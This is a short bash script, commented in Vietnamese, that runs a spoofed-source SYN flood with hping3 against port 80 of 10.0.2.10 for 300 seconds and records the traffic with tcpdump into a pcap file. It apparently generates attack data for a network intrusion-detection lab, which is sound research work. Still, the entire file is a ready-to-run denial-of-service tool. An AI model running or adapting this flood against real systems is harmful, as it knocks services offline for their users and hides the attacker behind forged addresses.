#!/bin/bash
# Kich ban tan cong IP Spoof Flood
VICTIM=10.0.2.10
DURATION=300

echo "Bat dau IP Spoof Flood vao $VICTIM trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# Bat tcpdump ghi lai traffic
tcpdump -i s2-eth99 -w datasets/s06_ip_spoof.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

# Xa SYN Flood voi IP nguon ngau nhien (--rand-source)
hping3 --rand-source -S -p 80 --flood $VICTIM &
HPING_PID=$!

# Cho het thoi gian roi dung tien trinh
sleep $DURATION
kill $TCPDUMP_PID $HPING_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat tan cong IP Spoof Flood!"